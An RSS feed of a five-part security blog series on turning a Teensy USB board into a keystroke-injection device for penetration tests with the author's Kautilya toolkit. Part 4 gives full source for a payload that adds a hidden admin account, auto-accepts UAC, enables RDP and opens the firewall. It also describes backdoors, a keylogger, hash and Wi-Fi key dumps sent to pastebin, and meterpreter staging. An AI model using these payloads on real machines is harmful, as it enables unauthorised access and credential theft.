<?xml version="1.0" encoding="ISO-8859-1"?>

<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
	<channel>
		<title>Garage4hackers Forum - Blogs - SamratAshok</title>
		<link>http://garage4hackers.com/blog.php?u=1798</link>
		<description>Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research.</description>
		<language>en</language>
		<lastBuildDate>Sun, 22 Mar 2020 10:26:43 GMT</lastBuildDate>
		<generator>vBulletin</generator>
		<ttl>60</ttl>
		<image>
			<url>http://garage4hackers.com/images/misc/rss.jpg</url>
			<title>Garage4hackers Forum - Blogs - SamratAshok</title>
			<link>http://garage4hackers.com/blog.php?u=1798</link>
		</image>
		<item>
			<title>Teensy USB HID for Penetration Testers - Part 5 - Advanced Windows Payloads of Kautil</title>
			<link>http://garage4hackers.com/entry.php?b=400</link>
			<pubDate>Sat, 01 Sep 2012 19:57:08 GMT</pubDate>
			<description>This is the fifth post in the series of Teensy USB HID for Penetration Testers. Sorry for the gap between this and the last post (almost three...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">This is the fifth post in the series of Teensy USB HID for Penetration Testers. Sorry for the gap between this and the last post (almost three months).  I was not sitting idle though, I released Nishang in between and there is a new and shiny version of Kautilya is out :)<br />
<br />
Let us have a look at some advanced payloads in Kautilya.<br />
<br />
<b>Hashdump</b><br />
<br />
This payload could be used to dump password hashes from Windows 7 machine. To use this payload, you have to upload powerdump meterpreter script from msf to a website (I used pastebin).  The script would then be downloaded on the victim machine later on.<br />
<br />
On a Windows 7 machine, you must have SYSTEM privilege to dump hashes using powerdump script. This SYSTEM privilege could be gained by scheduling a task as an administrator to be run as system. The second option asked during payload generation is the name of this task.<br />
<br />
Also, this payload pastes the hashes to pastebin as a private paste. To paste privately, you need a free account on pastebin. You need to provide username, password and api developer key (under the api link after you log in to pastebin) for your pastebin account. <br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=488&amp;d=1346529037" border="0" alt="Name:  hashdump.jpg
Views: 658
Size:  21.9 KB"  style="float: CONFIG" /><br />
<br />
Compile the generated output to Teensy, connect to the victim and after few seconds you should see this in the private pastes of the pastebin account used with payload<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=489&amp;d=1346529064" border="0" alt="Name:  pass_hashes - Pastebin.com - Mozilla Firefox_2012-09-01_21-48-04.jpg
Views: 692
Size:  21.5 KB"  style="float: CONFIG" /><br />
<br />
Neat!! Now we can crack or “pass” these in further attacks. (The hashes are from one of my test system).<br />
<br />
<b>Keylogger</b><br />
<br />
This payload runs a keylogger written in powershell and pastes keys to pastebin as a private paste after a given interval. Here is how to use this:<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=490&amp;d=1346529105" border="0" alt="Name:  keylogger.jpg
Views: 628
Size:  18.8 KB"  style="float: CONFIG" /><br />
<br />
Compile the output to Teensy, connect to the victim and you should see this in your pastebin account after few seconds (keep in mind the time interval you have given)<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=491&amp;d=1346529128" border="0" alt="Name:  01-09-2012 182340942 - Pastebin.com - Mozilla Firefox_2012-09-01_23-54-25.jpg
Views: 675
Size:  21.4 KB"  style="float: CONFIG" /><br />
<br />
Download this and use parsekeys.ps1 script to get some meaningful data. The script requires data from this pastebin to be copied in a text file called data.txt in the same folder as the script and creates a file called Logged_keys.txt with the parsed keys. This is how parsed keys should look.<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=492&amp;d=1346529155" border="0" alt="Name:  logged_keys - Notepad_2012-09-02_00-10-24.png
Views: 626
Size:  14.0 KB"  style="float: CONFIG" /><br />
<br />
The keylogger is able to log keys typed in web forms and windows prompts. This payload works with a normal user privs (no admin required). While using this payload, please keep in mind that pastebin limits the number of posts per day and I think the limit is stricter for private pastes. You either need a pro account or ask me nicely for implementing some other paste service ;) In fact, I tested this on tinypaste and it worked cleanly. The reason I stuck with pastebin is that I have seen pastebin allowed in many restricted environments as compared to tinypaste.<br />
<br />
<b>Wireless Rogue AP</b><br />
<br />
Windows 7 has a nice feature called Hosted Network. This is meant for sharing your wireless network with other devices. This feature could be used as a backdoor. This payload adds and starts a wireless hosted network on the victim. Then a meterpreter bind is executed in the memory using powershell. This technique is being used from this awesome post by Matt (used in many more payloads in Kautilya). Administrative access is required for this payload.<br />
<br />
You need to generate bind meterpreter payload using the command in payloadgen.txt in extras directory. The generated payload is to be copied to rogue_ap.txt in src directory. After that, create a payload using Kautilya<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=493&amp;d=1346529224" border="0" alt="Name:  rogue.jpg
Views: 627
Size:  22.4 KB"  style="float: CONFIG" /><br />
<br />
You should be able to see a  wireless network called “wifibdoor” after the output is compiled to Teensy and attached to the victim. After successfully connecting to the network you would like to connect to the bind payload but what would be the IP address to connect to? Open up command prompt and look at the gateway for this wireless connection. As this is hosted on the victim the default gateway would be the IP of victim.<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=494&amp;d=1346529245" border="0" alt="Name:  gw.png
Views: 620
Size:  3.6 KB"  style="float: CONFIG" /><br />
<br />
Connect to the port you used for msf bind payload on the default gateway using msf listener and bingo you have a meterpreter session. But wait, this is a bind shell what about Windows Firewall? If you look at the source,an exception is added to Windows Firewall exception list with program name as &quot;PowerShell Update&quot;.<br />
<br />
<b>Connect to Hotspot and Execute Code</b><br />
<br />
I got idea of this payload during an internal pen test. In case of that client, there was no internet access from the employees’ laptops barring few (almost 20) websites. In such a scenario, I use this technique which I call Injecting the Internet…hee hee.  <br />
<br />
This payload forces the target to connect to a hot spot controlled by you thus effectively bypassing any restrictions on the internet connectivity. This forceful connection is achieved by &quot;typing&quot; a wlan profile on the victim, the profile is then used to make a connection. Administrative access is required for thisaction.<br />
<br />
An ideal use case is using a hot spot hosted on a Smartphone within the wireless range of the target machine ;) In the third option (URL where the payload is hosted), you can use either a URL hosted on a web server running on your phone (I use kWS) or a URL from the internet. The Kautilya payload expects an executble in text format at this URL.<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=495&amp;d=1346529271" border="0" alt="Name:  connandexec.jpg
Views: 625
Size:  19.9 KB"  style="float: CONFIG" /><br />
<br />
After connecting the Teensy to a victim, we get this :)<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=496&amp;d=1346529286" border="0" alt="Name:  meter.jpg
Views: 622
Size:  13.2 KB"  style="float: CONFIG" /><br />
<br />
<b>WLAN Keys Dump</b><br />
<br />
This payload ***** information for all wlan profiles on the target system, including the in clear text and uploads them to pastebin as a private paste. A user with admin privs must be logged in for this payload to work.<br />
<br />
<b>Code Execution using DNS TXT queries</b><br />
<br />
This payload pulls first stage of a meterpreter from a DNS TXT record and executes it in memory using powershell. The payload makes two queries to differnt subdomains for a 32bit and 64 bit shellcode, the architecture is detected during the payload execution and the appropriate shellcode is executed. The meterpreter needs to be generated using the command in payloadgen.txt in extras directory in Kautilya.<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=497&amp;d=1346529310" border="0" alt="Name:  dnstxt.jpg
Views: 612
Size:  20.1 KB"  style="float: CONFIG" /><br />
<br />
The result is same as some of the payloads above. A nice meterpreter shell !<br />
<br />
Obviously, you should have control of TXT records of a domain to use this. I used a domain with zoneedit.com. It is easy and effective to use.You can fit first stage of a meterpreter inside a single TXT record.<br />
<br />
<b>Wait for Command</b><br />
<br />
This payload continuously queries a pastebin url for specific content. As soon as the content matches, another URL is opened looking for powershell script. The powershell script is downloaded and executed on the target.<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=498&amp;d=1346529331" border="0" alt="Name:  waitcmd.jpg
Views: 622
Size:  18.8 KB"  style="float: CONFIG" /><br />
<br />
 In the above example, the content of first URL is queried continuously (with an interval of 5 seconds). Whenever you want to execute powershell script on the target, change its content to that of the magicstring (which is &quot;balwant_rai_ke_kutte&quot; in this case ;) ) and the payload will download and execute powershell script from the second URL .<br />
<br />
This post covered many interesting payloads for Windows in Kautilya. In the next post in this series we will have a look at payloads for Linux (Ubuntu) and OS X. Please leave comments and feedback. I would be glad to implement (almost) any feature request.</blockquote>

]]></content:encoded>
			<dc:creator>SamratAshok</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=400</guid>
		</item>
		<item>
			<title>Teensy USB HID for Penetration Testers - Part 4 - Kautilya</title>
			<link>http://garage4hackers.com/entry.php?b=335</link>
			<pubDate>Tue, 22 May 2012 19:28:28 GMT</pubDate>
			<description><![CDATA[In third part of this series, we discussed how to write sketches using Arduino and Teensyduino. In this part, let's have a look at Kautilya. Kautilya...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">In third part of this series, we discussed how to write sketches using Arduino and Teensyduino. In this part, let's have a look at Kautilya. Kautilya is a toolkit written by me which helps in easing usage of Teensy in a penetration test. It is named after the famous Indian strategist, economist and political scientist Chankaya (Kautilya is one of his alias).  I will touch some less complex payload of Kautilya in this post.<br />
<br />
Kautilya has a menu driven UI which could be used to generate sketches without a need of knowing how to program a Teensy device. The toolkit is written in Ruby and is free and open source. It currently contains payloads for Windows 7 and Linux (tested on Ubuntu 11). Kautilya is specifically designed to support Teensy out of the box, there is absolutely no modification required to the hardware.My motive behind writing Kautilya is to bring Teensy to masses. During my talks about Kautilya and Teensy I observed that often Pen Testers do not have enough time to program a device for their usage. Payloads in Kautilya could be used for pre exploitation and post exploitation tasks other than the “usual” popping of shells. <br />
<br />
The process of writing payloads for a Windows 7 machine could be summed up as:<br />
<br />
    <ol class="decimal"><li style="">Understand the operating system in terms of USB buffer.</li><li style="">    Understand the commands supported and learn to write powershell or/and vbs.</li><li style="">    Recognize the built-in security measures (like UAC and powershell script execution policy) which may check privileged commands and then learn how to bypass them.</li><li style="">    Understand the time taken by operating system in completing various commands.</li><li style="">    Write the commands and scripts on Teensy.</li><li style="">    Understand more quirks of the command line when Teensy types out thing on victim.</li><li style="">    Try not to be too noisy on the victim.</li><li style="">    Test the payload and reach to final reasonable sketch.</li><li style="">    Compile the sketch to Teensy device.</li><li style="">    Attach it to the victim machine actively or using Social Engineering.</li><li style="">    Enjoy the pwnage!</li></ol><br />
<br />
(Next few lines may look like self promotion ;) )<br />
<br />
Kautilya automates steps 1-8 for you. Using Kautilya you just need to:<br />
<br />
   <ol class="decimal"><li style=""> Select a payload and select your options. A sketch (a .ino or .pde file) would be generated for you.</li><li style="">    Compile the sketch to Teensy device.</li><li style="">    Attach it to the victim machine actively or using Social Engineering.</li><li style="">    Enjoy the pwnage!</li></ol><br />
<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=385&amp;d=1337713119" border="0" alt="Name:  root@bt ~Desktopkautilya_2012-05-22_22-34-56.jpg
Views: 881
Size:  19.4 KB"  style="float: CONFIG" /><br />
<br />
Kautilya is tested on Ruby 1.9.2. It requires ruby gems &quot;colored&quot; and &quot;highline&quot;.<br />
<br />
Let's have a look at some of the payloads for Windows in Kautilya. All the payloads are tested on a default install of Windows 7.<br />
<br />
<b>Add a user and Enable RDP</b><br />
This payload adds an admin user to the victim. It also, enables and starts Terminal Service on the victim. An exception to Windows firewall is also added. This payload requires a user to be logged in with admin privileges.<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=386&amp;d=1337713159" border="0" alt="Name:  root@bt ~Desktopkautilya_2012-05-22_22-36-43.jpg
Views: 858
Size:  19.9 KB"  style="float: CONFIG" /><br />
<br />
The generated payload just needs to be compiled to a Teensy++. The device could then be connected to the victim. The victim will see start menu open up, some cmd being type and then a very small cmd window which type dark blue on black will do evil stuff for us...muhahaha<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=389&amp;d=1337714881" border="0" alt="Name:  work_2012-05-22_23-14-14.jpg
Views: 784
Size:  19.8 KB"  style="float: CONFIG" /><br />
Let's have a look at the source code for better understanding. Many payloads in Kautilya are similar in structure to this one.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">// Add an admin user and enable RDP payload of Kautilya
# define PAYLOAD_USER_ADD &quot;net user INPUT0 INPUT1 /add&quot;
//INPUT0 would be the username and INPUT1 would be the password.
# define PAYLOAD_GROUP_ADD &quot;net localgroup Administrators INPUT0 /add&quot;

void setup(){
 delay(5000);
 cmd_admin();
\\call to cmd_admin function
 delay(5000);
 send_alt_y();
\\\\call to send_alt_y function
 delay(5000);

add_user();
\\call to add_user function

Keyboard.println(&quot;reg add \&quot;HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f&quot;);
\\Enable terminal service
delay(2000);
Keyboard.println(&quot;reg add \&quot;HKLM\\System\\CurrentControlSet\\Services\\TermService\&quot; /v Start /t REG_DWORD /d 2 /f&quot;);
delay(2000);
Keyboard.println(&quot;sc start termservice&quot;);
\\start terminal service
delay(2000);
Keyboard.println(&quot;netsh firewall set service type = remotedesktop mode = enable&quot;);
\\Add execption to Windows Firewall
delay(3000);
Keyboard.println(&quot;exit&quot;);
}

void loop(){
}

void run(char *SomeCommand){
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();

  delay(1500);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();

  Keyboard.print(SomeCommand);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  Keyboard.set_key1(0);
  Keyboard.send_now();
}
void add_user(){
delay(2000);
Keyboard.println(PAYLOAD_USER_ADD);
delay(2000);
Keyboard.println(PAYLOAD_GROUP_ADD);
delay(1000);

}


void send_alt_y(){
\\This function sends an Alt + Y to UAC prompt
\\thus effectively saying yes to the prompt  
  delay(1000);
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.set_key1(KEY_Y);
  Keyboard.send_now();
  delay(100);

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  }
void cmd_admin(){
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.send_now();
  delay(1000);
  Keyboard.set_modifier(0);
  Keyboard.send_now();
  delay(2000);
  Keyboard.print(&quot;cmd /T:01 /K \&quot;@echo off &amp;&amp; mode con:COLS=15 LINES=1 &amp;&amp; title Installing Drivers\&quot; &quot;);
  \\this opens up a small cmd window which writes dark blue on black and have title Installing drivers
  delay(2000);
  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.send_now();
  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(200);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}</pre>
</div><b>Download and Execute</b><br />
This payload downloads an executable stored in text format from pastebin (or any other service which allows hosting of text without formatting), converts it back to exe on the victim and executes it in background. The exe must be converted into hex format using script exetotext.ps1 in extras folder of Kautilya. This script is originally an idea of Matt of Exploit-Monday blog.<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=387&amp;d=1337714781" border="0" alt="Name:  root@bt ~Desktopkautilya_2012-05-23_00-55-07.jpg
Views: 803
Size:  21.2 KB"  style="float: CONFIG" /><br />
<br />
In the above example, a windows reverse meterpreter is pasted to pastebin and the url is provided in the option.This payload could be used even with a low privilege user.<br />
<br />
<b>Forceful Browsing</b><br />
<br />
This payload opens up a hidden instance of Internet Explorer using a COM obbject of Internet Explorer and browses to the provided URL. An ideal use case could be hosting an exploit of msf  or a hook of BeEF  on the given URL. This payload is one of my favorites as it is able to get executed on a normal user (non administrative) privilege and is very silent.<br />
<br />
<b>Sethc and Utilman Backdoor</b><br />
<br />
This payload utilizes a useful hack in the Windows OS family. On a locked system, if you press Shift key five times (or Left Ctrl + Left Shift + Prnt Scr) i.e. sticky keys, sethc.exe is executed with SYSTEM level privileges. In a similar way, if Window key +U is pressed, utilmanager (which is utilman.exe ) is launched with SYSTEM privs. This payload attaches a an executable present on the machine as a debugger to sethc.exe and utilman.exe. The attahced executables can then be executed with SYSTEM level privileges on a locked Windows machine.<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=388&amp;d=1337714811" border="0" alt="Name:  root@bt ~Desktopkautilya_2012-05-22_23-56-24.jpg
Views: 786
Size:  21.3 KB"  style="float: CONFIG" /> <br />
<br />
We had a look at some less complex payloads of Kautilya. In the next post (or posts) I will explain some more complex and powerful payloads. At least one post will cover breaking Linux (Ubuntu11) too.<br />
<br />
I am thinking of creating some small videos demonstrating few payloads but only if some people ask for it ;) Please let me know if the length of blog posts is ok. Feedback and comments are welcome.</blockquote>

]]></content:encoded>
			<dc:creator>SamratAshok</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=335</guid>
		</item>
		<item>
			<title>Teensy USB HID for Penetration Testers - Part 3 - Programming sketches in Arduino</title>
			<link>http://garage4hackers.com/entry.php?b=326</link>
			<pubDate>Wed, 25 Apr 2012 17:21:46 GMT</pubDate>
			<description><![CDATA[In previous post we saw very basic usage of Arduino Development Environment (ADE) and ran our Hello World using Teensy. Let's have a look at doing...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">In previous post we saw very basic usage of Arduino Development Environment (ADE) and ran our Hello World using Teensy. Let's have a look at doing something more with Teensy and ADE.<br />
<br />
You know that there are two bare minimum functions called setup and loop in a sketch. But there are many more functions which are very useful while programming complex sketches. Have a look at the below sketch, which opens up notepad and types &quot;Hello World&quot; in it.<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">   void setup()

    {

    delay(5000);

    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);

    Keyboard.set_key1(KEY_R);

    Keyboard.send_now();

    delay(500);

    Keyboard.set_modifier(0);

    Keyboard.set_key1(0);

    Keyboard.send_now();

    Keyboard.print(&quot;notepad&quot;);

    Keyboard.set_key1(KEY_ENTER);

    Keyboard.send_now();

    Keyboard.set_key1(0);

    Keyboard.send_now();

    delay(2000);

    Keyboard.print(&quot;Hello World&quot;);

    }

    void loop()

    {

    }</pre>
</div>In a minute we will have a step by step look how the sketch is executed by Teensy. But before that, just recall how you open a notepad using &quot;Run&quot; prompt in Windows. These are the steps:<br />
<br />
1. Press &quot;Windows key + R&quot;<br />
<br />
2. Release &quot;Windows key + R&quot;<br />
<br />
2. Type &quot;notepad&quot; when the run prompt opens up.<br />
<br />
3. Press Enter.<br />
<br />
4. Release Enter<br />
<br />
Easy one. Now, if you map these steps to the sketch above you will find that the sketch is doing nothing but &quot;simulating&quot; your keystrokes. Let's have a look at the sketch again with comments<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">void setup()

    {

      delay(5000); //Delay required for OS to connect the device properly

      Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI); //Tell Teensy to press Windows key

      Keyboard.set_key1(KEY_R); //Tell Teensy to press R

      Keyboard.send_now(); //Press &quot;Windows key + R&quot;

     

      delay(500); //Wait for half second

      Keyboard.set_modifier(0); //Tell Teensy to release Windows key

      Keyboard.set_key1(0); //Tell Teensy to release R

      Keyboard.send_now(); //Release &quot;Windows key + R&quot;

      //Teensy should open a run prompt now

      Keyboard.print(&quot;notepad&quot;); //Type notepad in the run prompt

      Keyboard.set_key1(KEY_ENTER); //Tell Teensy to press Enter key

      Keyboard.send_now(); //Press Enter

      Keyboard.set_key1(0); //Tell Teensy to release Enter

      Keyboard.send_now(); //Release Enter

      delay(2000); //Wait for notepad to open

      Keyboard.print(&quot;Hello World&quot;); //Type Hello World in notepad

    }

    void loop()

    {

    }</pre>
</div>So the sketch makes more sense now. We used a number of new functions. Let's have a look at them:<br />
<br />
delay() delays the execution of sketch by Teensy for given milliseconds. delay(5000) means delaying the execution for 5 seconds.<br />
<br />
Keyboard.set_modifier sets a modifier key. There are four modifier keys<br />
<br />
<b>Name</b> <b> Function</b><br />
MODIFIERKEY_CTRL Control Key<br />
MODIFIERKEY_SHIFT Shift Key<br />
MODIFIERKEY_ALT Alt Key<br />
MODIFIERKEY_GUI Windows (PC) or Clover (Mac)<br />
<br />
 Table Courtesy: <a href="http://www.pjrc.com/teensy/td_keyboard.html" target="_blank">Teensyduino: Using USB Keyboard with Teensy on the Arduino IDE</a><br />
<br />
Note that I said it &quot;sets&quot; the modifier key. To send the key you need Keyboard.send_now() which sends all the &quot;set&quot; keys. We used Keyboard.setkey1 for setting the &quot;R&quot; key and then sent them together using Keyboard.send_now().<br />
<br />
As per great documentation here at pjrc.com USB keyboard can have up-to 6 normal keys and 4 modifier keys. A complete table of codes for all normal keys could be found on the same page.<br />
<br />
So we pressed the &quot;Windows keys + R&quot; by setting and sending the keys. Now to release them we need to set them to 0 and send them again. That is what we have done in above sketch by using Keyboard.set_modifier(0), Keyboard.setkey1(0) and Keyboard.send_now().<br />
<br />
Rest of the sketch is easy to understand and needs no explanation. <br />
<br />
In the next post we will have a look at Kautilya. Please leave comments and feedback.</blockquote>

]]></content:encoded>
			<dc:creator>SamratAshok</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=326</guid>
		</item>
		<item>
			<title>Teensy USB HID for Penetration Testers - Part 2 - Basics of Arduino and Hello World</title>
			<link>http://garage4hackers.com/entry.php?b=318</link>
			<pubDate>Wed, 11 Apr 2012 03:47:43 GMT</pubDate>
			<description>In the first post we installed Arduino Development Environment (ADE). Now lets have a look at basics of Programming Teensy using ADE 
 
Make sure...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">In the first post we installed Arduino Development Environment (ADE). Now lets have a look at basics of Programming Teensy using ADE<br />
<br />
Make sure that proper board is selected from the menu. Then choose the correct device type<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=333&amp;d=1334115765" border="0" alt="Name:  arduino-1.0_2012-04-04_11-34-51.jpg
Views: 3080
Size:  24.1 KB"  style="float: CONFIG" /><br />
<br />
In Arduino Development Environment (ADE), programming is done in a C type syntax. We have variables, methods, conditional operators and pointers etc. A program is called a sketch in ADE.<br />
<br />
Now, let's have a look at sketches. A sketch must have a <i>setup</i> and a <i>loop</i> function. This is a bare minimum sketch and compilation of a sketch will fail in absence of any of these methods. You can compile a sketch even with empty <i>setup</i> and <i>loop</i> functions.<br />
<br />
<i>setup</i> is called when a sketch is started. It is loaded only once. <i>loop</i> function keeps...umm...looping and repeats the code written inside it.<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=334&amp;d=1334115913" border="0" alt="Name:  sketch_apr04b  Arduino 1.0_2012-04-04_11-42-02.jpg
Views: 577
Size:  20.1 KB"  style="float: CONFIG" /><br />
<br />
Let's write a very simple sketch which types &quot;Hello World&quot; on the cursor.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_quote">
		<div class="quote_container">
			<div class="bbcode_quote_container"></div>
			
				void setup()<br />
<br />
{<br />
<br />
Keyboard.print(&quot;Hello World&quot;);<br />
<br />
}<br />
<br />
void loop()<br />
<br />
{<br />
<br />
}
			
		</div>
	</div>
</div>Now connect your Teensy device to the machine and compile and upload the code to the device by clicking on the Verify button. If you have done everything correctly you the sketch will be compiled and uploaded on the device. The device will reboot and should type out Hello World for you. Congrats you just ran your first sketch !!<br />
<br />
If you move &quot;Keyboard.print&quot; to loop, Teensy will keep typing Hello World indefinitely. We will have a look at <i>Keyboard</i> and other functions in detail in next post.<br />
<br />
If you encounter errors while compiling, double check that you have selected correct board type and device type. When you connect Teensy for the first time it may not type anything, since enough delays have not been introduced and device drivers take nearly 25 seconds to get loaded. Give it another try, it _will_ work.<br />
<br />
If you want your Teensy to type nothing on your machine and want to test this only on a test machine, as soon as the program is compiled and Teensy reboots, press the small reboot key on Teensy and make sure &quot;Auto&quot; reboot is disabled on Teensyloader application (if the Auto button is off i.e. Dark Green in color,it is disabled). Now pull Teensy out of your machine and connect it to a &quot;victim&quot;. You can see your device getting detected and type whatever was programmed.<br />
<br />
This is it. This is a very basic post and is intended for first time or basic users of Teensy and ADE.  In the next post we will look in more detail about writing Teensy sketches with ADE. Meanwhile, try this and post your comments, insults and feedback.</blockquote>

]]></content:encoded>
			<dc:creator>SamratAshok</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=318</guid>
		</item>
		<item>
			<title>Teensy USB HID for Penetration Testers - Part 1 - Introduction and Arduino Install</title>
			<link>http://garage4hackers.com/entry.php?b=313</link>
			<pubDate>Tue, 03 Apr 2012 19:44:24 GMT</pubDate>
			<description>Hi All, 
 
This is my first post to Garage, please bear with mistakes. I will write a series of posts which will also be posted on my blog. 
 
My...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Hi All,<br />
<br />
This is my first post to Garage, please bear with mistakes. I will write a series of posts which will also be posted on my blog.<br />
<br />
My first blog post after two back to back awesome conferences <a href="https://www.blackhat.com/html/bh-eu-12/bh-eu-12-briefings.html#mittal2" target="_blank">Black Hat Europe</a> and <a href="http://www.troopers.de/troopers12/agenda/more-fun-using-kautilya-or-is-it-a-thumb-drive-is-it-a-toy-no-it%E2%80%99s-a-keyboard/" target="_blank">Troopers</a>. At Black Hat Europe I conducted a workshop called Teensy Programming for Everyone. The workshop was well recieved by most of the participants. But I found that many of them found it difficult to setup Arduino for usage with Teensy and other basic stuff. So keeping in mind my upcoming trainings at <a href="http://shakacon.org/" target="_blank">Shakacon</a> and <a href="http://grrcon.org/events-training/training/teensy/" target="_blank">GrrCON</a> I am starting this series of blog posts which during initial posts will detail the basics of Teensyduino installation, structure of sketches and usage of Teensy. In later posts, I will cover <a href="http://code.google.com/p/kautilya/" target="_blank">Kautilya</a> and its usage. So let's get started.<br />
<br />
<a href="http://www.pjrc.com/teensy/" target="_blank">Teensy</a> is a programmable USB HID from nice guys at pjrc.com. I use Teensy++ (which is an improved version of Teensy) in Penetration Tests for its ability to be used as a programmable keyboard. To start with, this is how you can install Arduino with Teensyduino:<br />
<br />
<br />
For Windows (Tested on Windows 7 and XP) as an Adminsitrator<br />
<br />
1. Download <a href="http://arduino.cc/hu/Main/Software" target="_blank">Arduino</a> for Windows.<br />
<br />
2. Extract the zip archive.<br />
<br />
3. Download <a href="http://www.pjrc.com/teensy/td_107/teensyduino.exe" target="_blank">Teensyduino for Windows</a> which is a plugin for Arduino. We require this to add support for Teensy in Arduino.<br />
<br />
4. Download <a href="http://www.pjrc.com/teensy/serial_install.exe" target="_blank">Windows Serial Installer</a><br />
<br />
5. Run the the downloaded Serial Installer. You will get a warning as the driver is not signed by Microsoft. Accept it and continue with the installation.<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=317&amp;d=1333482049" border="0" alt="Name:  Teensy USB HID for Pen Testers_2012-04-03_23-04-06.jpg
Views: 689
Size:  22.2 KB"  style="float: CONFIG" /><br />
<br />
<br />
6. Run the Teensyduino, it will check for installed serial driver.Provide the path for the folder where Arduino has been extracted, the &quot;Next&quot; button will be activated only if a Arduino is found at the provided location.<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=318&amp;d=1333482108" border="0" alt="Name:  Teensyduino 1.07 Installer_2012-04-03_23-09-24.jpg
Views: 628
Size:  19.5 KB"  style="float: CONFIG" /><br />
<br />
You can choose more libraries to install on the next screen. You can choose to install none, Teensy does not require them.<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=319&amp;d=1333482133" border="0" alt="Name:  Teensyduino 1.07 Installer_2012-04-03_23-11-41.jpg
Views: 629
Size:  19.8 KB"  style="float: CONFIG" /><br />
<br />
7. Now you should see more options in Arduino.<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=320&amp;d=1333482158" border="0" alt="Name:  sketch_apr03a  Arduino 1.0_2012-04-03_23-14-29.jpg
Views: 625
Size:  18.6 KB"  style="float: CONFIG" /><br />
<br />
<br />
For Linux (Tested on Backtrack 5)<br />
<br />
<br />
1. Download <a href="http://arduino.cc/hu/Main/Software" target="_blank">Arduino</a> for Linux.<br />
<br />
2. Extract the zip archive.<br />
<br />
3. Download  <a href="http://www.pjrc.com/teensy/td_107/teensyduino.32bit" target="_blank">Teensyduino 32bit</a> or <a href="http://www.pjrc.com/teensy/td_107/teensyduino.64bit" target="_blank">Teensyduino 64bit</a> depending on your OS. We require this to add support for Teensy in Arduino.<br />
<br />
4. Download <a href="http://www.pjrc.com/teensy/49-teensy.rules" target="_blank">udev rules</a>. This is required to use Teensy as non root user.<br />
<br />
5. Install udev rules<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">sudo cp 49-teensy.rules /etc/udev/rules.d/</pre>
</div>6. Run the Teensyduino, provide the path for the directory where Arduino has been extracted.<br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=321&amp;d=1333482247" border="0" alt="Name:  BT5 - VMware Player_2012-04-04_00-11-30.jpg
Views: 782
Size:  17.3 KB"  style="float: CONFIG" /><br />
<br />
<br />
7. Now you should see more options in Arduino.<br />
<br />
This is it for the first post. Please leave comments and feedback.</blockquote>

]]></content:encoded>
			<dc:creator>SamratAshok</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=313</guid>
		</item>
	</channel>
</rss>
